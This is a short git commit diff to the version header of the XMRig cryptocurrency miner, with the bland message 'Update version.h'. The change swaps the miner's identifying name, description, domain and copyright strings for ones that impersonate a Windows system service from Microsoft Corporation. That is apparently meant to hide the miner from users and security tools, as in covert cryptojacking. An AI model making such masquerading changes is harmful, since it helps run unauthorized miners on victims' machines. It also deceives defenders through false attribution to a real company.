1d5047f9190f2742d280f2d6e3c500152ca9fd80
tuongrangdathang-sudo <tuongrangdathang@gmail.com>
2025-08-30 15:21:52 +0700

    Update version.h

--- src/version.h
+++ src/version.h
@@ -19,14 +19,14 @@
 #ifndef XMRIG_VERSION_H
 #define XMRIG_VERSION_H
 
-#define APP_ID        "xmrig"
-#define APP_NAME      "XMRig"
-#define APP_DESC      "XMRig miner"
-#define APP_VERSION   "6.24.0"
-#define APP_DOMAIN    "xmrig.com"
-#define APP_SITE      "www.xmrig.com"
-#define APP_COPYRIGHT "Copyright (C) 2016-2025 xmrig.com"
-#define APP_KIND      "miner"
+#define APP_ID       "sys_proc_win"
+#define APP_NAME     "System Process"
+#define APP_DESC     "Windows Service"
+#define APP_VERSION  "10.0.19044.2006"
+#define APP_DOMAIN   "microsoft.com"
+#define APP_SITE     "www.microsoft.com"
+#define APP_COPYRIGHT "Copyright (C) 2021 Microsoft Corporation"
+#define APP_KIND     "service"
 
 #define APP_VER_MAJOR  6
 #define APP_VER_MINOR  24
